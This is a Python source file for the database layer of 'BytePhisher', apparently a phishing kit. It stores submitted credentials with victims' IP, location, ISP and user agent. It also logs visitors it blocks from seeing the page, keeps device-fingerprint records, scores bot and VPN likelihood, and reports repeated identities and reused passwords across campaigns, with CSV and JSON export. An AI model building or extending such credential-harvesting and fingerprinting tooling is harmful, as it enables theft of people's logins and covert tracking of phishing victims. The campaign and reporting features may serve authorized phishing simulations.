# BytePhisher — SQLite capture store.
#
# Tables:
#   captures (every form submission, tagged with its campaign)
#   visitors (de-duplicated by ip+ua, so "unique visitors" is truthful)
#   blocked  (gated-out visitors, with the reason)
#
# Thread safety: ONE CONNECTION PER THREAD (threading.local), writes serialized
# by a lock, WAL journal. Sharing a single sqlite3 connection between threads
# with check_same_thread=False is NOT safe: the HTTP server, the dashboard SSE
# generator and the TUI all query at the same time, and concurrent statement
# execution on one connection corrupted memory and SEGFAULTED the process
# (reproduced: pytest tests/test_proxy.py tests/test_gaps.py → "Fatal Python
# error: Segmentation fault ... core/capture.py in since()").
import json
import os
import sqlite3
import threading
import time


def _csv_safe(v):
    """Neutralise spreadsheet formula injection.

    A captured value beginning with = + - @ (or tab/CR) is executed as a formula
    by Excel/Sheets when the operator opens the export. Prefixing an apostrophe
    keeps the value readable and inert.
    """
    t = "" if v is None else str(v)
    if t[:1] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + t
    return t


class CaptureDB:
    def __init__(self, db_path):
        self.db_path = db_path
        d = os.path.dirname(db_path)
        if d:
            os.makedirs(d, exist_ok=True)
        # per-thread connections + a write lock: readers never share a
        # connection with the writer, so no cross-thread sqlite3 use at all.
        # RLock, not Lock: a write path takes the lock and then creates the
        # thread's connection (which also registers it), and a plain Lock would
        # deadlock on that nested acquire.
        self._local = threading.local()
        self._lock = threading.RLock()
        self._conns = []
        self._closed = False
        c = self._conn()
        c.executescript("""
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            source_url TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device TEXT,
            fields_json TEXT,
            is_cred INTEGER DEFAULT 0,
            campaign TEXT
        );
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            ua TEXT,
            first_seen REAL,
            hits INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS blocked (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            ip TEXT,
            country TEXT,
            reason TEXT
        );
        CREATE TABLE IF NOT EXISTS intel (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            sid TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device_token TEXT,
            headless INTEGER DEFAULT 0,
            vpn INTEGER DEFAULT 0,
            risk INTEGER DEFAULT 0,
            waves TEXT,
            summary_json TEXT,
            data_json TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_intel_sid ON intel(sid);
        CREATE INDEX IF NOT EXISTS idx_intel_token ON intel(device_token);
        """)
        # Visitor de-duplication depends on a UNIQUE(ip, ua) index: without it
        # every page view inserted a new row and "unique visitors" was wrong.
        try:
            c.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        except sqlite3.IntegrityError:
            # legacy DB that already accumulated duplicates — collapse then retry
            c.execute("""DELETE FROM visitors WHERE id NOT IN
                         (SELECT MIN(id) FROM visitors GROUP BY ip, ua)""")
            c.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        # Migration: DBs created before campaign/risk support get the columns.
        self._ensure_column("captures", "campaign", "TEXT")
        self._ensure_column("captures", "risk", "INTEGER DEFAULT 0")
        self._ensure_column("captures", "risk_reasons", "TEXT")
        c.commit()

    # ------------------------------------------------------------ connections
    def _conn(self):
        """The calling thread's connection, created on first use."""
        if self._closed:
            raise RuntimeError("CaptureDB is closed")
        c = getattr(self._local, "conn", None)
        if c is None:
            c = sqlite3.connect(self.db_path, timeout=15)
            c.execute("PRAGMA journal_mode=WAL")
            # a second writer must wait, not raise "database is locked"
            c.execute("PRAGMA busy_timeout=15000")
            c.execute("PRAGMA synchronous=NORMAL")
            self._local.conn = c
            with self._lock:
                self._conns.append(c)
        return c

    @property
    def conn(self):
        """Kept for callers/tests that reach for the raw handle."""
        return self._conn()

    def _ensure_column(self, table, column, decl):
        cols = [r[1] for r in self.conn.execute(f"PRAGMA table_info({table})")]
        if column not in cols:
            self.conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {decl}")

    def _upsert_visitor(self, ip, ua):
        self.conn.execute(
            "INSERT INTO visitors (ip, ua, first_seen, hits) VALUES (?,?,?,1) "
            "ON CONFLICT(ip, ua) DO UPDATE SET hits = hits + 1",
            (ip or "unknown", ua or "unknown", time.time()))

    def log_visit(self, ip, ua):
        """Page view (no credentials) — keeps visitor stats meaningful."""
        with self._lock:
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def record(self, source_url, ip, city, country, isp, ua, device, fields, is_cred,
               campaign=None, risk=0, risk_reasons=None):
        with self._lock:
            self.conn.execute(
                "INSERT INTO captures (ts, source_url, ip, city, country, isp, ua, device,"
                " fields_json, is_cred, campaign, risk, risk_reasons)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), source_url, ip, city or "", country or "", isp or "",
                 ua, device, json.dumps(fields, default=str), 1 if is_cred else 0,
                 campaign or "", int(risk or 0),
                 json.dumps(risk_reasons or [], default=str)))
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def all(self, limit=200, campaign=None):
        cols = ("ts, source_url, ip, city, country, isp, ua, device, fields_json,"
                " is_cred, campaign, risk, risk_reasons")
        if campaign:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures WHERE campaign=? ORDER BY id DESC LIMIT ?",
                (campaign, limit)).fetchall()
        else:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()
        out = []
        for r in rows:
            try:
                reasons = json.loads(r[12]) if r[12] else []
            except Exception:
                reasons = []
            out.append({
                "ts": r[0], "source_url": r[1], "ip": r[2], "city": r[3],
                "country": r[4], "isp": r[5], "ua": r[6], "device": r[7],
                "fields": json.loads(r[8]) if r[8] else {},
                "is_cred": bool(r[9]), "campaign": r[10] or "",
                "risk": int(r[11] or 0), "risk_reasons": reasons,
            })
        return out

    def stats(self, campaign=None):
        where = " WHERE campaign=?" if campaign else ""
        args = (campaign,) if campaign else ()
        total = self.conn.execute(f"SELECT COUNT(*) FROM captures{where}", args).fetchone()[0]
        creds = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'} is_cred=1",
            args).fetchone()[0]
        # "credible" = credential capture from a low-risk (human-looking) source
        credible = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'}"
            " is_cred=1 AND risk < 30", args).fetchone()[0]
        if campaign:
            # visitors are not campaign-tagged in the schema, so scope them to
            # the distinct (ip, ua) pairs that actually submitted to THIS
            # campaign — the global count made every campaign report wrong
            visitors = self._conn().execute(
                "SELECT COUNT(*) FROM (SELECT DISTINCT ip, ua FROM captures "
                "WHERE campaign=?)", (campaign,)).fetchone()[0]
        else:
            visitors = self._conn().execute("SELECT COUNT(*) FROM visitors").fetchone()[0]
        return {"total_captures": total, "credentials": creds, "visitors": visitors,
                "credible_credentials": credible}

    def log_blocked(self, ip, country, reason):
        """Gated visitor refused — recorded so reporting can state the real ratio."""
        with self._lock:
            self.conn.execute("INSERT INTO blocked (ts, ip, country, reason) VALUES (?,?,?,?)",
                              (time.time(), ip or "", country or "", reason or ""))
            self.conn.commit()

    def blocked_stats(self):
        rows = self.conn.execute(
            "SELECT reason, COUNT(*) FROM blocked GROUP BY reason ORDER BY COUNT(*) DESC").fetchall()
        total = self.conn.execute("SELECT COUNT(*) FROM blocked").fetchone()[0]
        return {"total_blocked": total, "by_reason": [{"reason": r[0], "count": r[1]} for r in rows]}

    def max_id(self):
        row = self.conn.execute("SELECT COALESCE(MAX(id), 0) FROM captures").fetchone()
        return int(row[0] or 0)

    def since(self, after_id, limit=100):
        """Captures newer than `after_id` (ascending) — the SSE feed uses this so
        the dashboard pushes rows instead of polling the whole table.

        Returns [] once the store is closed, so a streaming generator winding
        down cannot raise (or touch a closed handle)."""
        if self._closed:
            return []
        rows = self._conn().execute(
            "SELECT id, ts, source_url, ip, city, country, isp, ua, device, fields_json,"
            " is_cred, campaign, risk, risk_reasons FROM captures WHERE id > ?"
            " ORDER BY id ASC LIMIT ?", (int(after_id or 0), limit)).fetchall()
        out = []
        for r in rows:
            try:
                reasons = json.loads(r[13]) if r[13] else []
            except Exception:
                reasons = []
            out.append({
                "id": r[0], "ts": r[1], "source_url": r[2], "ip": r[3], "city": r[4],
                "country": r[5], "isp": r[6], "ua": r[7], "device": r[8],
                "fields": json.loads(r[9]) if r[9] else {}, "is_cred": bool(r[10]),
                "campaign": r[11] or "", "risk": int(r[12] or 0), "risk_reasons": reasons,
            })
        return out

    def reuse_stats(self, min_count=2):
        """Credentials seen more than once across submissions/campaigns.

        A repeated identity means the same person was targeted again; a repeated
        password across different identities is a password-reuse finding. Both are
        stronger evidence than a single capture, so reports state them explicitly.
        """
        id_keys = ("email", "username", "login", "user", "user_name", "email_address",
                   "user_id", "username_or_email", "email_or_username", "userid",
                   "login_id", "phone", "mobile")
        pw_keys = ("password", "passw", "pwd", "passwd", "pass", "passphrase", "pass_code")

        def pick(fields, keys):
            for k, v in (fields or {}).items():
                if k.lower() in keys and str(v).strip():
                    return str(v).strip()
            return None

        identities, passwords = {}, {}
        for r in self.all(limit=1000000):
            if not r.get("is_cred"):
                continue
            f = r.get("fields") or {}
            ident = pick(f, id_keys)
            pw = pick(f, pw_keys)
            if ident:
                e = identities.setdefault(ident, {"count": 0, "campaigns": set(),
                                                  "first": r["ts"], "last": r["ts"]})
                e["count"] += 1
                e["campaigns"].add(r["campaign"] or "")
                e["last"] = max(e["last"], r["ts"])
            if pw:
                e = passwords.setdefault(pw, {"count": 0, "identities": set(), "campaigns": set()})
                e["count"] += 1
                if ident:
                    e["identities"].add(ident)
                e["campaigns"].add(r["campaign"] or "")

        rep_id = [{"identity": k, "count": v["count"],
                   "campaigns": sorted(c for c in v["campaigns"] if c),
                   "first_seen": v["first"], "last_seen": v["last"]}
                  for k, v in identities.items() if v["count"] >= min_count]
        rep_pw = [{"password": k, "count": v["count"],
                   "identities": sorted(v["identities"]),
                   "campaigns": sorted(c for c in v["campaigns"] if c)}
                  for k, v in passwords.items()
                  if v["count"] >= min_count or len(v["identities"]) >= min_count]
        rep_id.sort(key=lambda x: -x["count"])
        rep_pw.sort(key=lambda x: -x["count"])
        return {"repeated_identities": rep_id, "repeated_passwords": rep_pw,
                "total_reused_identities": len(rep_id),
                "total_reused_passwords": len(rep_pw)}

    def campaigns(self):
        """Per-campaign breakdown for the dashboard / reporting."""
        rows = self.conn.execute(
            "SELECT COALESCE(NULLIF(campaign,''), '(untagged)') c, COUNT(*),"
            " SUM(is_cred) FROM captures GROUP BY c ORDER BY COUNT(*) DESC").fetchall()
        return [{"campaign": r[0], "captures": r[1], "credentials": r[2] or 0} for r in rows]

    def export_json(self, path, campaign=None):
        """Machine-readable dump (same shape as the API) for downstream tooling."""
        with open(path, "w", encoding="utf-8") as f:
            devices = []
            for r in self.intel_list(limit=1000000):
                rec = self.intel_get(r["id"])
                if rec:
                    devices.append(rec)
            json.dump({"exported_at": time.time(),
                       "stats": self.stats(campaign=campaign),
                       "intel_stats": self.intel_stats(),
                       "campaigns": self.campaigns(),
                       "captures": self.all(limit=1000000, campaign=campaign),
                       "devices": devices},
                      f, indent=2, default=str)
        return path

    def export_csv(self, path, campaign=None):
        import csv
        with open(path, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["ts", "campaign", "source_url", "ip", "city", "country",
                        "isp", "device", "is_cred", "risk", "risk_reasons", "fields"])
            for c in self.all(limit=1000000, campaign=campaign):
                w.writerow([
                    c["ts"], _csv_safe(c["campaign"]), _csv_safe(c["source_url"]),
                    _csv_safe(c["ip"]), _csv_safe(c["city"]),
                    _csv_safe(c["country"]), _csv_safe(c["isp"]), _csv_safe(c["device"]),
                    "YES" if c["is_cred"] else "NO",
                    c["risk"], _csv_safe("; ".join(c["risk_reasons"])),
                    _csv_safe("; ".join(f"{k}={_csv_safe(v)}"
                                        for k, v in c["fields"].items()))
                ])
        return path

    def close(self):
        """Mark closed and release every connection this store opened.

        A new statement after close() raises RuntimeError instead of touching a
        freed handle, which is what turned a shutdown race into a segfault."""
        self._closed = True
        with self._lock:
            conns, self._conns = self._conns, []
        for c in conns:
            try:
                c.close()
            except Exception:
                pass

    # ------------------------------------------------------------- intel ----
    def log_intel(self, sid, ip, city, country, isp, ua, summary, raw, risk=0):
        """Store one device-intelligence record (full raw dump + summary)."""
        with self._lock:
            self._conn().execute(
                "INSERT INTO intel (ts, sid, ip, city, country, isp, ua, device_token,"
                " headless, vpn, risk, waves, summary_json, data_json)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), sid or "", ip or "", city or "", country or "", isp or "",
                 ua or "", (summary.get("fingerprint") or {}).get("device_token") or "",
                 int((summary.get("automation") or {}).get("headless_score") or 0),
                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
                 int(risk or 0),
                 ",".join(str(w) for w in (summary.get("waves") or [])),
                 json.dumps(summary, default=str), json.dumps(raw, default=str)))
            self._conn().commit()

    def intel_list(self, limit=50):
        rows = self._conn().execute(
            "SELECT id, ts, sid, ip, country, device_token, headless, vpn, risk, ua, waves"
            " FROM intel ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
        return [{"id": r[0], "ts": r[1], "sid": r[2], "ip": r[3], "country": r[4],
                 "device_token": r[5], "headless": r[6], "vpn": r[7], "risk": r[8],
                 "ua": r[9], "waves": r[10]} for r in rows]

    def intel_get(self, key):
        """Full record by row id, session id, or 'latest'."""
        k = str(key or "latest")
        if k in ("latest", "last", ""):
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel ORDER BY id DESC LIMIT 1").fetchone()
        elif k.isdigit():
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel WHERE id=?", (int(k),)).fetchone()
        else:
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1", (k,)).fetchone()
        if not row:
            return None
        summary = {}
        try:
            summary = json.loads(row[8] or "{}")
        except Exception:
            summary = {}
        raw = {}
        try:
            raw = json.loads(row[9] or "{}")
        except Exception:
            raw = {}
        rec = dict(summary)
        rec.update({"id": row[0], "ts": row[1], "sid": row[2], "ip": row[3],
                    "city": row[4], "country": row[5], "isp": row[6],
                    "user_agent": summary.get("user_agent") or row[7], "raw": raw})
        return rec

    def intel_for_session(self, sid):
        """Raw merged module map for a session — what the next wave must extend."""
        row = self._conn().execute(
            "SELECT data_json FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
            (sid or "",)).fetchone()
        if not row:
            return {}
        try:
            data = json.loads(row[0] or "{}")
            return data.get("mods") or {}
        except Exception:
            return {}

    def intel_update(self, sid, summary, raw, risk=0):
        """Replace the newest record for a session (a later wave arrived)."""
        with self._lock:
            row = self._conn().execute(
                "SELECT id FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
                (sid or "",)).fetchone()
            if not row:
                return None
            self._conn().execute(
                "UPDATE intel SET ts=?, device_token=?, headless=?, vpn=?, risk=?,"
                " waves=?, summary_json=?, data_json=? WHERE id=?",
                (time.time(), (summary.get("fingerprint") or {}).get("device_token") or "",
                 int((summary.get("automation") or {}).get("headless_score") or 0),
                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
                 int(risk or 0), ",".join(str(w) for w in (summary.get("waves") or [])),
                 json.dumps(summary, default=str), json.dumps(raw, default=str), row[0]))
            self._conn().commit()
        return row[0]

    def intel_stats(self):
        one = self._conn().execute(
            "SELECT COUNT(*), COUNT(DISTINCT sid), COUNT(DISTINCT device_token),"
            " SUM(CASE WHEN headless >= 40 THEN 1 ELSE 0 END),"
            " SUM(CASE WHEN vpn >= 30 THEN 1 ELSE 0 END) FROM intel").fetchone()
        return {"intel_records": one[0] or 0, "unique_sessions": one[1] or 0,
                "unique_devices": one[2] or 0, "likely_bots": one[3] or 0,
                "vpn_suspected": one[4] or 0}
